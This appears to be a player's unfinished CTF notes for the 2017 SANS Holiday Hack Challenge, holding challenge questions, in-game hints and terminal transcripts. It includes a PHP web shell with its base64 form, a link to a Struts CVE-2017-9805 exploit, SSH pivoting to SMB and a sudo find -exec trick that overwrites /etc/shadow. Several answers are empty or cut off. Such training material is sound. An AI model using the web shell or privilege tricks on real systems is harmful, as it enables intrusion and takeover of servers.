# Great Pages

* [Page 1](https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf)
* [Page 2](https://www.holidayhackchallenge.com/2017/pages/aa814d1c25455480942cb4106e6cde84be86fb30/GreatBookPage2.pdf)
* [Page 3](https://www.holidayhackchallenge.com/2017/pages/57737da397cbfda84e88b573cd96d45fcf34a5da/GreatBookPage3.pdf)
* [Page 4](https://www.holidayhackchallenge.com/2017/pages/f192a884f68af24ae55d9d9ad4adf8d3a3995258/GreatBookPage4.pdf)
* [Page 5](https://www.holidayhackchallenge.com/2017/pages/05c0cacc8cfb96bb5531540e9b2b839a0604225f/GreatBookPage5.pdf)
* [Page 6](https://www.holidayhackchallenge.com/2017/pages/8943e0524e1bf0ea8c7968e85b2444323cb237af/GreatBookPage6.pdf)

# The Story

## 1) Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?

[Page 1](https://www.holidayhackchallenge.com/2017/pages/6dda7650725302f59ea42047206bd4ee5f928d19/GreatBookPage1.pdf)

ANSWER: About This Book...



## 2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?

For hints associated with this challenge, Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level can provide some tips.

### Hints

#### Twitter

[Sparkle Redberry Twitter](https://twitter.com/GlitteryElf)

Follows [Tom Hessman](https://twitter.com/tkh16)

1. Dear #lazyweb: How do I fix a malicious alias on my Linux box? It seems to be stopping me from killing processes...
1. I tried `man alias`, but that doesn't even exist. It looks like maybe it's a built-in to bash itself?
1. Update: I read into `man bash`, and I even found a section on ALIASES (starting with "Aliases allow a string to be substituted for a word when it is used as the first word of a simple command[...]" but I couldn't even make it 40 words in before I got all cross-eyed.

#### Game

1. We're excited to debut the new Letters to Santa site this year. Alabaster worked hard on that project for over a year. I got to work with the development version of the site early on in the project lifecycle.
1. Near the end of the development we had to rush a few things to get the new site moved to production. Some development content on the letter page should probably have been removed, but ended up marked as hidden to avoid added change control paperwork.
1. Alabaster's primary backend experience is with Apache Struts. I love Apache and have a local instance set up on my home computer with a web shell. Web shells are great as a backdoor for me to access my system remotely.  I just choose a really long complex file name so that no one else knows how to access it.
1. A simple web shell is to create a PHP file in the web root with `<?php echo "<pre>" . shell_exec($_GET['e']) . "</pre>"; ?>`. Then, I visit the URL with my commands. For example, *http://server/complexFileName.php?e=ls*.
1. There are lots of different web shell tools available. [You can get a simple PHP web shell that is easy to use here](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985).
1. That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.
1. Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn't break. I actually just checked and there are lots of different exploits out there for vulnerable systems. [Here is a useful article](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code).
1. Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.

### Work

There is a link to the development version. The div is hidden.

```
    <!-- Development version -->
    <a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>
```
The dev page states it's running apache struts at the bottom of the page.

Use the struts vuln

[cve-2017-9805.py](https://github.com/chrisjd20/cve-2017-9805.py)

php code:
```php
<?php echo "<pre>" . shell_exec($_GET['e']) . "</pre>"; ?>
```

base64:
PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFsnZSddKSAuICI8L3ByZT4iOyA/Pgo=

command:
echo PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFsnZSddKSAuICI8L3ByZT4iOyA/Pgo= | base64 -d | 

ANSWER:

## 3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?

For hints, please see Holly Evergreen in the Cryokinetic Magic Level.

### Hints

#### Twitter

[Holly Evergreen on Twitter](https://twitter.com/GreenesterElf)

Following [Daniel Penolino](https://twitter.com/dpendolino)

1. Alright, who chmod -x'd and then removed chmod from my system? Not funny! I really need to run a program on this server, for serious. Was it you, @PepperyGoodness ? Weren't you mucking about with ARM64 recently?
1. I still can't figure out Pepper Minstix's issue. It looks like the binary is compiled for another architecture. I think qemu can help, but I don't want to run the entire OS :\ [doc.opensuse.org/documentation/…](https://doc.opensuse.org/documentation/leap/virtualization/html/book.virt/cha.qemu.running.html) helps, but I just want one binary, not the whole system!

#### Game

1. Nmap has default host discovery checks that may not discover all hosts.  To customize which ports Nmap looks for during host discovery, use `-PS` with a port number, such as `-PS123` to check TCP port 123 to determine if a host is up.
1. Alabaster likes to keep life simple. He chooses a strong password, and sticks with it.
1. The Letters to Santa server is limited in what commands are available. Fortunately, SSH has enough flexibility to make access through the Letters server a fruitcake-walk.
1. Have you used port forwarding with SSH before? It's pretty amazing! [Here is a quick guide](https://help.ubuntu.com/community/SSH/OpenSSH/PortForwarding).
1. Windows users can use SSH port forwarding too, using PuTTY! [Here is a quick guide for Windows users](https://blog.devolutions.net/2017/04/how-to-configure-an-ssh-tunnel-on-putty.html).
1. Sometimes it's better to use a Linux system as the SSH port forwarder, and interact with a Linux system from a Windows box. For example, running `ssh -L :445:SMBSERVERIP:445 username@sshserver` will allow you to access your Linux server's IP, which will forward directly to the SMB server over SSH.
1. Linux systems can also interact with a Windows server using the smbclient utility: `smbclient -L smbserverorforwarder -U username`.

### Work

TBD

## 4) Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?

Pepper Minstix provides some hints for this challenge on the There's Snow Place Like Home Level.

### Hints

#### Twitter

[Pepper Minstix on Twitter](https://twitter.com/PepperyGoodness)

Follows [Jeff McJunkin](https://twitter.com/jeffmcjunkin)

1. Actually, @GreenesterElf , you're better at prompt commands than I am. Why can't I get this model train thing working? I'm in the right directory like you taught me, but this system is still saying "No such file or directory"

Is really into pepper and peppermint.

#### Game

1. I'm so excited for the new email system that Alabaster Snowball set up for us. He spent a lot of time working on it. Should make it very easy for us to share cookie recipes. I just hope that he cleared up all his dev files. I know he was working on keeping the dev files from search engine indexers.
1. The new email system's authentication should be impenetrable. Alabaster was telling me that he came up with his own encryption scheme using AES256, so you know it's secure.
1. AES256? Honestly, I don't know much about it, but Alabaster explained the basic idea and it sounded easy. During decryption, the first 16 bytes are removed and used as the initialization vector or "IV." Then the IV + the secret key are used with AES256 to decrypt the remaining bytes of the encrypted string.
1. Hmmm. That's a good question, I'm not sure what would happen if the encrypted string was only 16 bytes long.
1. Every year when Santa gets back from delivering presents to the good girls and boys, he tells us stories about all the cookies he receives. I love everything about cookies! Cooking them, eating them, editing them, decorating them, you name it!

### Work

## 5) How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?

Minty Candycane offers some tips for this challenge in the North Pole and Beyond.

### Hints

#### Twitter

[Minty Candycane on Twitter](https://twitter.com/SirMintsALot)

Follows [Josh Wright](https://twitter.com/joswr1ght)

1. The more I live my life as a Linux command-line user, the more I see problems waiting to be solved with cut, sort, uniq, head, and tail.
1. Oh wow, @Sw4mp_f0x and @bluscreenofjeff did a great job on this Parsing for Pentesters series! [https://t.co/g1LcCWjH4Q]
1. The only thing that last article didn't really help me with was *counting* unique lines. This post looks super helpful for that! [unix.stackexchange.com/questions/1700…](https://unix.stackexchange.com/questions/170043/sort-and-count-number-of-occurrence-of-lines/263849 (it's even against web server logs, just the wrong field)

#### Game

1. I have a very important job at the North Pole: GDPR compliance officer. Mostly I handle data privacy requests relating to Santa's naughty and nice list. I maintain the documents for compliance on the North Pole file store server.
1. The North Pole Police Department works closely with Santa on the naughty and nice list infractions. Mild naughty events are "1 coal" infractions, but can reach as high as "5 coal" level.
1. I'm still a little shaken up from when I had to call them in the other day. Two elves started fighting, pulling hair, and throwing rocks. There was even a super atomic wedgie involved! Later we were told that they were Munchkin Moles, though I'm still not sure I can believe that.
1. Unrelated, but: have you had the pleasure of working with JSON before? It's an easy way to programmatically send data back and forth over a network. There are simple JSON import/export features for almost every programming language!
1. One of the conveniences of working with JSON is that you can edit the data files easily with any text editor. There are lots of online services to convert JSON to other formats too, such as CSV data. Sometimes the JSON files need a little coaxing to get the data in the right format for conversion, though.

### Work

## 6) The North Pole engineering team has introduced an Elf as a Service (EaaS) platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?

For hints on this challenge, please consult with Sugarplum Mary in the North Pole and Beyond.

### Hints

#### Twitter

[Sugarplum Mary on Twitter](https://twitter.com/ThePlumSweetest)

Follows [Ed Skoudis](https://twitter.com/edskoudis) and [Verify Ed](https://twitter.com/VeryfiedEd)

1. Hey @PepperyGoodness, can you help me with an SQL problem I've seen? I think I need to do GROUP BY, but I'm not quite sure of the syntax.

#### Game

1. The Elf As A Service (EAAS) site is a new service we're experimenting with in the North Pole. Previously, if you needed a special engineer for toy production, you would have to write a memo and distribute it to several people for approval. All of that process is automated now, allowing production teams to request assistance through the EAAS site.
1. The EAAS site uses XML data to manage requests from other teams. There is a sample request layout available that you can download. Teams just customize the XML and submit!
1. I think some of the elves got a little lazy toward the go-live date for EAAS. The sample XML data doesn't even include a DTD reference.
1. XML processing can be complex. I saw an interesting article recently on the [dangers of external XML entities](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities).

### Work

## 7) Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI) to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?

Shinny Upatree offers hints for this challenge inside the North Pole and Beyond.

### Hints

#### Twitter

[Shinny Upatree on Twitter](https://twitter.com/ClimbALLdaTrees)

Follows [W. Clay Moody](https://twitter.com/wclaymoody)

1. You know that feeling when something horrible has happened? So I was editing /etc/shadow manually, and... well:
   ```
   $ ls -l /etc/shadow
   -rw-rw---- 1 root shadow 0 Dec  7 01:13 /etc/shadow
   ```
   @1Horse1OSSleigh tells me the "Non-default shadow group permissions" might help.... okay?
1.  think I have some pseudo (sp?) permissions on this Unix server, but I don't know what that means. @GreenesterElf said this was a "learning opportunity" and won't give me the answer :'(

#### Game

1. I'm still a little angry with Alabaster for reprimanding me for a security violation. He still checks his email from the EMI system!
1. He tells us not to install unnecessary software on systems, but he's running IIS with ASPX services on the EMI server, and Microsoft Office!
1. Personally, I don't use Microsoft Word. I'll take vim and LaTeX any day. Word does have its advantages though, including some of the Dynamic Data Exchange features for transferring data between applications and obtaining data from external data sources, including executables.

### Work

## 8) Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?

For hints on solving this challenge, please locate Wunorse Openslae in the North Pole and Beyond.

### Hints

#### Twitter

[Wunorse Openslae on Twitter](https://twitter.com/1Horse1OSSleigh)

Follows [Even Booth](https://twitter.com/evanbooth)

1. Everybody seems to always question my username. Did you know that almost all sleigh designs are burdened by restrictive licenses?
1. Hence my username: "One Horse Open Source Sleigh". It's still a work-in-progress, but I'm trying to get Old Saint Nick himself to allow beta testing for elf ride-sharing around the North Pole.

#### Game

1. Many people don't know this, but most of us elves have multiple jobs here in the North Pole. In addition to working in Santa's workshop, I also work as a help desk support associate for the North Pole Elf Database site. I answer password reset requests, mostly from other elves.
1. One time, I got a weird email with a JavaScript alert and my account got hacked. Fortunately, Alabaster was able to add some filtering on the system to prevent that from happening again. I sure hope he tested his changes against the common evasion techniques discussed on the [XSS filter evasion cheat sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
1. It's never a good idea to come up with your own encryption scheme with cookies. Alabaster told me he uses JWT tokens because they are super secure as long as you use a long and complex key. Otherwise, they could be cracked and recreated using any old framework like [pyjwt](https://github.com/jpadilla/pyjwt) to forge a key.
1. The interface we use lets us query our directory database with all the employee information. Per Santa's request, Alabaster restricted the search results to just the elves and reindeer. Hopefully, he secured that too. I found an article recently talking about [injection against similar databases](https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap).

### Work


## 9) Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?

To answer this question, you need to fetch at least five of the seven pages of The Great Book and complete the final level of the North Pole and Beyond.

Answer: Glinda the Good Witch

> It's me, Glinda the Good Witch of Oz! You found me and ruined my genius plan!
> 
> You see, I cast a magic spell on the Abominable Snow Monster to make him throw all the snowballs at the North Pole. Why? Because I knew a giant snowball fight would stir up hostilities between the Elves and the Munchkins, resulting in all-out WAR between Oz and the North Pole. I was going to sell my magic and spells to both sides. War profiteering would mean GREAT business for me.
> 
> But, alas, you and your sleuthing foiled my venture. And I would have gotten away with it too, if it weren't for you meddling kids!

# Terminals

## Winconceivable: The Cliffs of Winsanity
[Game](https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&uid=ee838751-39b4-423a-8d67-6d935c88d650)
```
                ___,@
               /  <
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (@____) || (____@)
         \______||______/
My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.
Kill the "santaslittlehelperd" process to complete this challenge.
elf@95e7d11fd705:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.0  0.0  18028  2844 pts/0    Ss   22:38   0:00 /bin/bash /sbin/init
elf          8  0.0  0.0   4224   656 pts/0    S    22:38   0:00 /usr/bin/santaslittlehelperd
elf         11  0.1  0.0  13528  6404 pts/0    S    22:38   0:00 /sbin/kworker
elf         12  0.0  0.0  18248  3200 pts/0    S    22:38   0:00 /bin/bash
elf         18  0.5  0.0  71468 26436 pts/0    S    22:38   0:00 /sbin/kworker
elf         91  0.0  0.0  34424  2920 pts/0    R+   22:40   0:00 ps aux
elf@95e7d11fd705:~$ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;
s/[;&|]\s*alert$//'\'')"'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias kill='true'
alias killall='true'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
alias pkill='true'
alias skill='true'
elf@95e7d11fd705:~$ unalias kill 
elf@95e7d11fd705:~$ kill -9 8
elf@95e7d11fd705:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
elf          1  0.0  0.0  18028  2844 pts/0    Ss   22:38   0:00 /bin/bash /sbin/init
elf         12  0.0  0.0  18248  3320 pts/0    S    22:38   0:00 /bin/bash
elf        110  0.0  0.0  34424  2860 pts/0    R+   22:40   0:00 ps aux
elf@95e7d11fd705:~$ 
```

## Winter Wonder Landing
[Game](https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                                 |
                               \ ' /
                             -- (*) --
                                >*<
                               >0<@<
                              >>>@<<*
                             >@>*<0<<<
                            >*>>@<<<@<<
                           >@>>0<<<*<<@<
                          >*>>0<<@<<<@<<<
                         >@>>*<<@<>*<<0<*<
           \*/          >0>>*<<@<>0><<*<@<<
       ___\\U//___     >*>>@><0<<*>>@><*<0<<
       |\\ | | \\|    >@>>0<*<0>>@<<0<<<*<@<<  
       | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<
       |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<<
       |\\_|_|&&_// ||*.*.*.*|_\\db//_               
       """"|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|>>>>>>|
           ~~~~~~~~         '""""`------'
My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?
Find and run the elftalkd binary to complete this challenge.
elf@f666a50bd0a2:~$ alias
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
elf@f666a50bd0a2:~$ which find
/usr/local/bin/find
elf@f666a50bd0a2:~$ find 
bash: /usr/local/bin/find: cannot execute binary file: Exec format error
elf@f666a50bd0a2:~$ /usr/bin/find / -iname elftalkd
/usr/bin/find: '/var/cache/ldconfig': Permission denied
/usr/bin/find: '/var/cache/apt/archives/partial': Permission denied
/usr/bin/find: '/var/lib/apt/lists/partial': Permission denied
/run/elftalk/bin/elftalkd
/usr/bin/find: '/proc/tty/driver': Permission denied
/usr/bin/find: '/root': Permission denied
elf@f666a50bd0a2:~$ /run/elftalk/bin/elftalkd
        Running in interactive mode
        --== Initializing elftalkd ==--
Initializing Messaging System!
Nice-O-Meter configured to 0.90 sensitivity.
Acquiring messages from local networks...
--== Initialization Complete ==--

      _  __ _        _ _       _ 
     | |/ _| |      | | |     | |
  ___| | |_| |_ __ _| | | ____| |
 / _ \ |  _| __/ _` | | |/ / _` |
|  __/ | | | || (_| | |   < (_| |
 \___|_|_|  \__\__,_|_|_|\_\__,_|
-*> elftalkd! <*-
Version 9000.1 (Build 31337) 
By Santa Claus & The Elf Team
Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
Using libc6 version 2.23-0ubuntu9
LANG=en_US.UTF-8
Timezone=UTC
Commencing Elf Talk Daemon (pid=6021)... done!
Background daemon...
elf@f666a50bd0a2:~$ 
```

## Cryokinetic Magic
[Game](https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.
Run the CandyCaneStriper executable to complete this challenge.
elf@d6d2285095a4:~$ ls -al
total 68
drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 .
drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
-rw-r--r-- 1 elf  elf    220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root  3143 Dec 15 19:59 .bashrc
-rw-r--r-- 1 elf  elf    655 May 16  2017 .profile
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
elf@d6d2285095a4:~$ ./CandyCaneStriper
bash: ./CandyCaneStriper: Permission denied
elf@d6d2285095a4:~$ ls /lib64
ld-linux-x86-64.so.2
elf@d6d2285095a4:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
                   _..._
                 .'\\ //`,      
                /\\.'``'.=",
               / \/     ;==|
              /\\/    .'\`,`
             / \/     `""`
            /\\/
           /\\/
          /\ /
         /\\/
        /`\/
        \\/
         `
The candy cane striping machine is up and running!
elf@d6d2285095a4:~$ 
```

## There's Snow Place Like Home
[Game](https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                             ______
                          .-"""".._'.       _,##
                   _..__ |.-"""-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-""-.  |  |#'`-._,##'`
               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-";.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.
total 444
-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup
elf@e4ee9dc21cae:~$ file trainstartup
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685
e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
elf@e4ee9dc21cae:~$ qemu-arm trainstartup
                             ______
    Merry Christmas
    Merry Christmas
v
>*<
^
/o\
/   \               @.·
/~~   \                .
/ ° ~~  \         · .    
/      ~~ \       ◆  ·    
/     °   ~~\    ·     0
/~~           \   .─··─ · o
             /°  ~~  .*· · . \  ├──┼──┤                                        
              │  ──┬─°─┬─°─°─°─ └──┴──┘                                        
≠==≠==≠==≠==──┼──=≠     ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠
              │   /└───┘\┌───┐       ┌┐                                        
                         └───┘    /▒▒▒▒                                        
≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠
You did it! Thank you!
elf@9f82b8f65b29:~$ 
```

## Bumbles Bounce
[Game](https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                           ._    _.
                           (_)  (_)                  <> \  / <>
                            .\::/.                   \_\/  \/_/ 
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _<>_\_\<>/_/_<>_
      :o|   |   |o:         '/::\'                 <> / /<>\ \ <>
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           >O<             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       <> /  \ <>
      :o|   |   |o:                   /\_\\><//_/\
      ''   /o\   ''     '.|  |.'      \/ //><\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/ 
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=>>::>o<::<<=-
    :->@<-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o 
  o    :    o           \* \ / */                   /o\
       o                 >--X--<
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
total 28704
-rw-r--r-- 1 root root 24191488 Dec  4 17:11 access.log
-rwxr-xr-x 1 root root  5197336 Dec 11 17:31 runtoanswer
elf@c43edd6eda2b:~$ grep -o '"[^"]*"$' access.log| sort | uniq -c | sort -n | head -n 1
      1 "Dillo/3.0.5"
elf@c43edd6eda2b:~$ ./runtoanswer
Starting up, please wait......
Enter the name of the least popular browser in the web log: Dillo/3.0.5
That is the least common browser in the web log! Congratulations!
elf@c43edd6eda2b:~$ 
```

## I Don't Think We're In Kansas Anymore
[Game](https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
total 20684
-rw-r--r-- 1 root root 15982592 Nov 29 19:28 christmassongs.db
-rwxr-xr-x 1 root root  5197352 Dec  7 15:10 runtoanswer
elf@9cb73137ef01:~$ /usr/bin/sqlite3 christmassongs.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite> select s.title, count(*) from songs s, likes l where l.songid=s.id group by s.title order by count(*) desc limit 5;
Stairway to Heaven|11325
Joy to the World|2162
The Little Boy that Santa Claus Forgot|2140
I Farted on Santa's Lap (Now Christmas Is Gonna Stink for Me)|2132
Christmas Memories|2129
sqlite> 
elf@9cb73137ef01:~$ ./runtoanswer 
Starting up, please wait......
Enter the name of the song with the most likes: Stairway to Heaven
That is the #1 Christmas song, congratulations!
elf@9cb73137ef01:~$ 
```

[Poppies](https://2017.holidayhackchallenge.com/assets/game/textures/poppies-f059c6edbcc20f71cba374496764ed0d.png)
[Transparent image](https://images.vexels.com/media/users/3/142236/isolated/preview/5813595300ed1fd400a76ec2d9958144-fire-smoke-flame-by-vexels.png)


## Oh Wait! Maybe WE Are...
[Game](https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
              \ /
            -->*<--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /@\_\_\@\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/@/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/@/_/_/o/_/0/_\
   jgs       [___]  
My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.
Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
Hint: What commands can you run with sudo?
elf@efe5512c7bd3:~$ cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
# Host alias specification
# User alias specification
# Cmnd alias specification
# User privilege specification
root    ALL=(ALL:ALL) ALL
# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL
# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
# The elf user can run `find` with the shadow group
elf             ALL=(:shadow) NOPASSWD:/usr/bin/find
# See sudoers(5) for more information on "#include" directives:
#includedir /etc/sudoers.d
elf@efe5512c7bd3:~$ sudo -g shadow /usr/bin/find /etc/shadow.bak -exec cp /etc/shadow.bak /etc/shadow \;
elf@efe5512c7bd3:~$ inspect_da_box 
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
